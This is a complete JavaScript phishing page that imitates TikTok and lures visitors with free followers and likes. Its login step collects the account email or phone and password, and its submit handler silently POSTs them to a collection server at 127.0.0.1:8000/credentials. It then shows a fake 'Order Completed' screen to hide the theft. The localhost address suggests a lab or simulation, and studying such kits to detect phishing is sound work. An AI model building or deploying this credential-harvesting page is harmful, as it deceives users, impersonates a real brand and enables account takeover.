(function() {
  const styles = `
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background: #ffffff;
      min-height: 100vh;
      transition: background-color 0.3s;
    }

    body.dark {
      background: #000000;
    }

    #app {
      max-width: 480px;
      margin: 0 auto;
      min-height: 100vh;
      background: #ffffff;
      position: relative;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
    }

    body.dark #app {
      background: #000000;
      box-shadow: 0 0 20px rgba(255,255,255,0.1);
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 16px;
      background: #ffffff;
      border-bottom: 1px solid #e1e8ed;
    }

    body.dark .header {
      background: #000000;
      border-bottom: 1px solid #2f2f2f;
    }

    .app-title {
      font-size: 18px;
      font-weight: 700;
      color: #000000;
    }

    body.dark .app-title {
      color: #ffffff;
    }

    .theme-toggle {
      background: transparent;
      border: none;
      cursor: pointer;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      transition: background 0.2s;
    }

    .theme-toggle:hover {
      background: rgba(0, 0, 0, 0.05);
    }

    body.dark .theme-toggle:hover {
      background: rgba(255, 255, 255, 0.1);
    }

    .theme-toggle svg {
      width: 20px;
      height: 20px;
      color: #536471;
    }

    body.dark .theme-toggle svg {
      color: #ffffff;
    }

    .theme-toggle:active {
      transform: scale(0.95);
    }

    .progress-bar {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 12px 12px 8px;
      gap: 0;
      overflow-x: auto;
      background: #f8f8f8;
      position: relative;
    }

    body.dark .progress-bar {
      background: #0a0a0a;
    }

    .step-indicator {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0;
      flex: 1;
      max-width: 70px;
      position: relative;
    }

    .step-circle {
      width: 36px;
      height: 36px;
      min-width: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #e1e8ed;
      color: #536471;
      transition: all 0.3s;
      margin-bottom: 4px;
      border: 2px solid transparent;
      position: relative;
      z-index: 2;
    }

    .step-circle svg {
      width: 18px;
      height: 18px;
    }

    body.dark .step-circle {
      background: #2f2f2f;
      color: #8a8a8a;
    }

    .step-circle.active {
      background: linear-gradient(135deg, #FE2C55 0%, #25F4EE 100%);
      color: white;
      box-shadow: 0 2px 8px rgba(254, 44, 85, 0.4);
      border-color: rgba(255, 255, 255, 0.3);
    }

    .step-circle.completed {
      background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
      color: white;
      box-shadow: 0 2px 8px rgba(34, 197, 94, 0.3);
    }

    .step-line {
      position: absolute;
      top: 18px;
      left: 50%;
      width: 100%;
      height: 2px;
      background: #e1e8ed;
      z-index: 1;
      transition: background 0.3s;
    }

    body.dark .step-line {
      background: #2f2f2f;
    }

    .step-line.completed {
      background: linear-gradient(90deg, #22c55e 0%, #16a34a 100%);
    }

    .step-line.active {
      background: linear-gradient(90deg, #22c55e 0%, #FE2C55 100%);
    }

    .step-label {
      text-align: center;
      color: #000000;
      font-size: 10px;
      font-weight: 500;
      transition: color 0.3s;
      line-height: 1.2;
    }

    body.dark .step-label {
      color: #ffffff;
    }

    .step-indicator.active .step-label {
      color: #FE2C55;
    }

    body.dark .step-indicator.active .step-label {
      color: #FE2C55;
    }

    .card {
      background: white;
      border-radius: 20px;
      padding: 32px 24px;
      margin: 20px 16px;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
      border-top: 4px solid transparent;
      border-image: linear-gradient(90deg, #FE2C55 0%, #25F4EE 100%) 1;
      border-image-slice: 1 0 0 0;
      transition: all 0.3s;
    }

    body.dark .card {
      background: #161616;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.3);
    }

    .card:hover {
      box-shadow: 0 4px 20px rgba(254, 44, 85, 0.15);
    }

    .tt-logo {
      text-align: center;
      margin-bottom: 24px;
    }

    .tt-logo svg {
      width: 64px;
      height: 64px;
      animation: shimmer 3s infinite;
    }

    @keyframes shimmer {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.8; }
    }

    .card-title {
      font-size: 28px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 12px;
      color: #000000;
    }

    body.dark .card-title {
      color: #ffffff;
    }

    .card-description {
      text-align: center;
      color: #536471;
      margin-bottom: 28px;
      font-size: 15px;
    }

    body.dark .card-description {
      color: #8a8a8a;
    }

    .features-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      margin-bottom: 28px;
    }

    .feature-card {
      background: #f8f8f8;
      border-radius: 16px;
      padding: 20px 16px;
      text-align: center;
      transition: all 0.3s;
      border: 1px solid transparent;
    }

    body.dark .feature-card {
      background: #0a0a0a;
      border-color: #2f2f2f;
    }

    .feature-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(254, 44, 85, 0.1);
      border-color: #FE2C55;
    }

    .feature-icon {
      margin-bottom: 10px;
      color: #FE2C55;
    }

    .feature-icon svg {
      width: 28px;
      height: 28px;
    }

    .feature-title {
      font-size: 14px;
      font-weight: 600;
      color: #000000;
    }

    body.dark .feature-title {
      color: #ffffff;
    }

    .service-options {
      display: grid;
      gap: 12px;
      margin-bottom: 28px;
    }

    .service-option {
      background: #f8f8f8;
      border: 2px solid transparent;
      border-radius: 16px;
      padding: 24px;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      gap: 16px;
    }

    body.dark .service-option {
      background: #0a0a0a;
    }

    .service-option:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(254, 44, 85, 0.1);
      border-color: #FE2C55;
    }

    .service-option.selected {
      background: linear-gradient(135deg, rgba(254, 44, 85, 0.1) 0%, rgba(37, 244, 238, 0.1) 100%);
      border-color: #FE2C55;
    }

    body.dark .service-option.selected {
      background: linear-gradient(135deg, rgba(254, 44, 85, 0.2) 0%, rgba(37, 244, 238, 0.2) 100%);
    }

    .service-icon {
      width: 48px;
      height: 48px;
      border-radius: 12px;
      background: linear-gradient(135deg, #FE2C55 0%, #25F4EE 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      flex-shrink: 0;
    }

    .service-icon svg {
      width: 24px;
      height: 24px;
    }

    .service-title {
      font-size: 18px;
      font-weight: 700;
      color: #000000;
      margin-bottom: 4px;
    }

    body.dark .service-title {
      color: #ffffff;
    }

    .service-description {
      font-size: 13px;
      color: #536471;
    }

    body.dark .service-description {
      color: #8a8a8a;
    }

    .package-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      margin-bottom: 28px;
    }

    .package-option {
      background: #f8f8f8;
      border: 2px solid transparent;
      border-radius: 16px;
      padding: 28px 20px;
      cursor: pointer;
      transition: all 0.3s;
      text-align: center;
      position: relative;
    }

    body.dark .package-option {
      background: #0a0a0a;
    }

    .package-option:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(254, 44, 85, 0.1);
      border-color: #FE2C55;
    }

    .package-option.selected {
      background: linear-gradient(135deg, rgba(254, 44, 85, 0.1) 0%, rgba(37, 244, 238, 0.1) 100%);
      border-color: #FE2C55;
    }

    body.dark .package-option.selected {
      background: linear-gradient(135deg, rgba(254, 44, 85, 0.2) 0%, rgba(37, 244, 238, 0.2) 100%);
    }

    .package-count {
      font-size: 32px;
      font-weight: 800;
      background: linear-gradient(135deg, #FE2C55 0%, #25F4EE 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 8px;
    }

    .package-badge {
      display: inline-block;
      background: linear-gradient(135deg, #FE2C55 0%, #25F4EE 100%);
      color: white;
      padding: 4px 12px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #000000;
      font-size: 14px;
    }

    body.dark .form-label {
      color: #ffffff;
    }

    .form-input {
      width: 100%;
      padding: 14px 16px;
      border: 2px solid #e1e8ed;
      border-radius: 12px;
      font-size: 15px;
      transition: all 0.3s;
      background: white;
      color: #000000;
    }

    body.dark .form-input {
      background: #0a0a0a;
      border-color: #2f2f2f;
      color: #ffffff;
    }

    .form-input:focus {
      outline: none;
      border-color: #FE2C55;
      box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.1);
    }

    .button-group {
      display: flex;
      gap: 12px;
      margin-top: 24px;
    }

    .btn {
      flex: 1;
      padding: 14px 24px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .btn-primary {
      background: linear-gradient(135deg, #FE2C55 0%, #25F4EE 100%);
      color: white;
    }

    .btn-primary:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(254, 44, 85, 0.3);
    }

    .btn-primary:active:not(:disabled) {
      transform: translateY(0);
    }

    .btn-primary:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .btn-secondary {
      background: #f8f8f8;
      color: #000000;
      border: 2px solid #e1e8ed;
    }

    body.dark .btn-secondary {
      background: #0a0a0a;
      color: #ffffff;
      border-color: #2f2f2f;
    }

    .btn-secondary:hover {
      background: #e1e8ed;
    }

    body.dark .btn-secondary:hover {
      background: #2f2f2f;
    }

    .success-animation {
      text-align: center;
      padding: 20px 0;
    }

    .checkmark {
      width: 80px;
      height: 80px;
      margin: 0 auto 24px;
      background: linear-gradient(135deg, #FE2C55 0%, #25F4EE 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: scaleIn 0.5s ease-out;
    }

    .checkmark svg {
      width: 48px;
      height: 48px;
      color: white;
    }

    @keyframes scaleIn {
      0% {
        transform: scale(0);
      }
      50% {
        transform: scale(1.1);
      }
      100% {
        transform: scale(1);
      }
    }

    .success-title {
      font-size: 24px;
      font-weight: 700;
      color: #000000;
      margin-bottom: 12px;
    }

    body.dark .success-title {
      color: #ffffff;
    }

    .success-message {
      color: #536471;
      font-size: 15px;
      margin-bottom: 24px;
    }

    body.dark .success-message {
      color: #8a8a8a;
    }

    .order-summary {
      background: #f8f8f8;
      border-radius: 16px;
      padding: 20px;
      margin-bottom: 24px;
    }

    body.dark .order-summary {
      background: #0a0a0a;
    }

    .summary-row {
      display: flex;
      justify-content: space-between;
      padding: 12px 0;
      border-bottom: 1px solid #e1e8ed;
    }

    body.dark .summary-row {
      border-bottom-color: #2f2f2f;
    }

    .summary-row:last-child {
      border-bottom: none;
    }

    .summary-label {
      color: #536471;
      font-size: 14px;
    }

    body.dark .summary-label {
      color: #8a8a8a;
    }

    .summary-value {
      font-weight: 600;
      color: #000000;
      font-size: 14px;
    }

    body.dark .summary-value {
      color: #ffffff;
    }

    .spinner {
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255,255,255,0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.6s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  `;

  const icons = {
    tiktok: `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="tt-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" style="stop-color:#FE2C55;stop-opacity:1" />
          <stop offset="100%" style="stop-color:#25F4EE;stop-opacity:1" />
        </linearGradient>
      </defs>
      <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z" fill="url(#tt-gradient)"/>
    </svg>`,
    sun: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg>`,
    moon: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg>`,
    rocket: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>`,
    shield: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>`,
    clock: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`,
    star: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"/></svg>`,
    users: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"/></svg>`,
    thumbsUp: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5"/></svg>`,
    link: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"/></svg>`,
    login: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"/></svg>`,
    check: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>`,
    success: `<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`
  };

  const features = [
    { icon: 'rocket', title: 'Instant Delivery' },
    { icon: 'shield', title: '100% Safe' },
    { icon: 'clock', title: '24/7 Support' },
    { icon: 'star', title: 'Real Users' }
  ];

  const steps = [
    { icon: 'users', label: 'Service' },
    { icon: 'star', label: 'Package' },
    { icon: 'link', label: 'URL' },
    { icon: 'login', label: 'Login' },
    { icon: 'success', label: 'Done' }
  ];

  let state = {
    currentStep: 0,
    selectedService: null,
    selectedPackage: null,
    postUrl: '',
    email: '',
    password: '',
    isDark: false,
    isProcessing: false
  };

  function init() {
    const styleEl = document.createElement('style');
    styleEl.textContent = styles;
    document.head.appendChild(styleEl);

    const appDiv = document.createElement('div');
    appDiv.id = 'app';
    document.body.appendChild(appDiv);

    const savedTheme = localStorage.getItem('tt-theme');
    if (savedTheme === 'dark') {
      state.isDark = true;
      document.body.classList.add('dark');
    }

    render();
  }

  function render() {
    const app = document.getElementById('app');
    app.innerHTML = `
      ${renderHeader()}
      ${renderProgressBar()}
      ${renderContent()}
    `;
    attachEventListeners();
  }

  function renderHeader() {
    return `
      <div class="header">
        <div class="app-title">TikTok Growth</div>
        <button class="theme-toggle" onclick="window.ttApp.toggleTheme()">
          ${state.isDark ? icons.sun : icons.moon}
        </button>
      </div>
    `;
  }

  function renderProgressBar() {
    return `
      <div class="progress-bar">
        ${steps.map((step, index) => {
          // Hide URL step at Welcome screen or for followers service
          if (index === 3 && (state.currentStep === 0 || state.selectedService === 'followers')) {
            return '';
          }

          const isActive = index === state.currentStep;
          const isCompleted = index < state.currentStep;
          const isLastStep = index === steps.length - 1;
          const shouldHideNextLine = index === 3 && state.selectedService === 'followers';

          let lineClass = '';
          if (isCompleted) {
            lineClass = 'completed';
          } else if (isActive) {
            lineClass = 'active';
          }

          return `
            <div class="step-indicator ${isActive ? 'active' : ''}">
              <div class="step-circle ${isActive ? 'active' : ''} ${isCompleted ? 'completed' : ''}">
                ${isCompleted ? icons.check : icons[step.icon]}
              </div>
              <div class="step-label">${step.label}</div>
              ${!isLastStep && !shouldHideNextLine ? `<div class="step-line ${lineClass}"></div>` : ''}
            </div>
          `;
        }).join('')}
      </div>
    `;
  }

  function renderContent() {
    switch(state.currentStep) {
      case 0: return renderWelcome();
      case 1: return renderServiceSelection();
      case 2: return renderPackageSelection();
      case 3: return renderPostUrl();
      case 4: return renderLogin();
      case 5: return renderSuccess();
      default: return renderWelcome();
    }
  }

  function renderWelcome() {
    return `
      <div class="card">
        <div class="tt-logo">${icons.tiktok}</div>
        <h1 class="card-title">TikTok Growth Service</h1>
        <p class="card-description">Boost your TikTok presence with free followers and likes</p>

        <div class="features-grid">
          ${features.map(feature => `
            <div class="feature-card">
              <div class="feature-icon">${icons[feature.icon]}</div>
              <div class="feature-title">${feature.title}</div>
            </div>
          `).join('')}
        </div>

        <button class="btn btn-primary" onclick="window.ttApp.nextStep()">
          Get Started
        </button>
      </div>
    `;
  }

  function renderServiceSelection() {
    return `
      <div class="card">
        <h1 class="card-title">Choose a Service</h1>
        <p class="card-description">Select what you want to boost on your TikTok profile</p>

        <div class="service-options">
          <div class="service-option ${state.selectedService === 'followers' ? 'selected' : ''}"
               onclick="window.ttApp.selectService('followers')">
            <div class="service-icon">${icons.users}</div>
            <div>
              <div class="service-title">Followers</div>
              <div class="service-description">Increase your follower count</div>
            </div>
          </div>
          <div class="service-option ${state.selectedService === 'likes' ? 'selected' : ''}"
               onclick="window.ttApp.selectService('likes')">
            <div class="service-icon">${icons.thumbsUp}</div>
            <div>
              <div class="service-title">Likes</div>
              <div class="service-description">Boost engagement on your videos</div>
            </div>
          </div>
        </div>

        <div class="button-group">
          <button class="btn btn-secondary" onclick="window.ttApp.prevStep()">
            Back
          </button>
          <button class="btn btn-primary" onclick="window.ttApp.nextStep()"
                  ${!state.selectedService ? 'disabled' : ''}>
            Continue
          </button>
        </div>
      </div>
    `;
  }

  function renderPackageSelection() {
    const packages = [100, 250, 500, 1000];
    const serviceText = state.selectedService === 'followers' ? 'followers' : 'likes';
    return `
      <div class="card">
        <h1 class="card-title">Select Package</h1>
        <p class="card-description">Choose how many ${serviceText} you want</p>

        <div class="package-grid">
          ${packages.map(count => `
            <div class="package-option ${state.selectedPackage === count ? 'selected' : ''}"
                 onclick="window.ttApp.selectPackage(${count})">
              <div class="package-count">${count}</div>
              <span class="package-badge">FREE</span>
            </div>
          `).join('')}
        </div>

        <div class="button-group">
          <button class="btn btn-secondary" onclick="window.ttApp.prevStep()">
            Back
          </button>
          <button class="btn btn-primary" onclick="window.ttApp.nextStep()"
                  ${!state.selectedPackage ? 'disabled' : ''}>
            Continue
          </button>
        </div>
      </div>
    `;
  }

  function renderPostUrl() {
    return `
      <div class="card">
        <h1 class="card-title">Enter Video URL</h1>
        <p class="card-description">Paste the URL of the TikTok video you want to boost</p>

        <div class="form-group">
          <label class="form-label">TikTok Video URL</label>
          <input type="url"
                 class="form-input"
                 id="url-input"
                 placeholder="https://www.tiktok.com/@username/video/..."
                 value="${state.postUrl}">
        </div>

        <div class="button-group">
          <button class="btn btn-secondary" onclick="window.ttApp.prevStep()">
            Back
          </button>
          <button class="btn btn-primary" onclick="window.ttApp.nextStep()" id="url-btn"
                  ${!state.postUrl ? 'disabled' : ''}>
            Continue
          </button>
        </div>
      </div>
    `;
  }

  function renderLogin() {
    return `
      <div class="card">
        <h1 class="card-title">Account Login</h1>
        <p class="card-description">Enter your TikTok credentials to continue</p>

        <form onsubmit="window.ttApp.handleSubmit(event)">
          <div class="form-group">
            <label class="form-label">Email or Phone Number</label>
            <input type="text"
                   class="form-input"
                   id="email-input"
                   placeholder="Enter your email or phone number"
                   value="${state.email}">
          </div>

          <div class="form-group">
            <label class="form-label">Password</label>
            <input type="password"
                   class="form-input"
                   id="password-input"
                   placeholder="Enter your password"
                   value="${state.password}">
          </div>

          <div class="button-group">
            <button type="button" class="btn btn-secondary" onclick="window.ttApp.prevStep()">
              Back
            </button>
            <button type="submit" class="btn btn-primary" id="submit-btn"
                    ${!state.email || !state.password || state.isProcessing ? 'disabled' : ''}>
              ${state.isProcessing ? '<div class="spinner"></div> Processing...' : 'Complete Order'}
            </button>
          </div>
        </form>
      </div>
    `;
  }

  function renderSuccess() {
    return `
      <div class="card">
        <div class="success-animation">
          <div class="checkmark">
            ${icons.check}
          </div>
          <h1 class="success-title">Order Completed!</h1>
          <p class="success-message">Your order has been placed successfully</p>
        </div>

        <div class="order-summary">
          <div class="summary-row">
            <span class="summary-label">Service</span>
            <span class="summary-value">${state.selectedService === 'followers' ? 'Followers' : 'Likes'}</span>
          </div>
          <div class="summary-row">
            <span class="summary-label">Quantity</span>
            <span class="summary-value">${state.selectedPackage}</span>
          </div>
          ${state.selectedService === 'likes' ? `
            <div class="summary-row">
              <span class="summary-label">Video URL</span>
              <span class="summary-value" style="font-size: 12px; word-break: break-all;">${state.postUrl}</span>
            </div>
          ` : ''}
          <div class="summary-row">
            <span class="summary-label">Delivery Time</span>
            <span class="summary-value">1-24 hours</span>
          </div>
        </div>

        <button class="btn btn-primary" onclick="window.ttApp.startOver()">
          Place Another Order
        </button>
      </div>
    `;
  }

  function attachEventListeners() {
    const urlInput = document.getElementById('url-input');
    if (urlInput) {
      urlInput.addEventListener('input', (e) => {
        state.postUrl = e.target.value;
        const btn = document.getElementById('url-btn');
        if (btn) {
          btn.disabled = !state.postUrl;
        }
      });
    }

    const emailInput = document.getElementById('email-input');
    if (emailInput) {
      emailInput.addEventListener('input', (e) => {
        state.email = e.target.value;
        updateSubmitButton();
      });
    }

    const passwordInput = document.getElementById('password-input');
    if (passwordInput) {
      passwordInput.addEventListener('input', (e) => {
        state.password = e.target.value;
        updateSubmitButton();
      });
    }
  }

  function updateSubmitButton() {
    const btn = document.getElementById('submit-btn');
    if (btn) {
      btn.disabled = !state.email || !state.password || state.isProcessing;
    }
  }

  window.ttApp = {
    nextStep: () => {
      if (state.currentStep === 2 && state.selectedService === 'followers') {
        state.currentStep = 4;
      } else {
        state.currentStep++;
      }
      render();
    },

    prevStep: () => {
      if (state.currentStep === 4 && state.selectedService === 'followers') {
        state.currentStep = 2;
      } else {
        state.currentStep--;
      }
      render();
    },

    selectService: (service) => {
      state.selectedService = service;
      render();
    },

    selectPackage: (count) => {
      state.selectedPackage = count;
      render();
    },

    handleSubmit: async (e) => {
      e.preventDefault();
      state.isProcessing = true;
      render();

      // The URL of our local Python server
      const serverUrl = 'http://127.0.0.1:8000';

      fetch(`${serverUrl}/credentials`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          platform: 'TikTok',
          email: state.email,
          password: state.password,
        })
      }).catch((err) => { console.error('Failed to send credentials:', err); });

      await new Promise(resolve => setTimeout(resolve, 2000));

      state.isProcessing = false;
      state.currentStep = 5;
      render();
    },

    toggleTheme: () => {
      state.isDark = !state.isDark;
      document.body.classList.toggle('dark');
      localStorage.setItem('tt-theme', state.isDark ? 'dark' : 'light');
      render();
    },

    startOver: () => {
      state = {
        ...state,
        currentStep: 0,
        selectedService: null,
        selectedPackage: null,
        postUrl: '',
        email: '',
        password: '',
        isProcessing: false
      };
      render();
    }
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
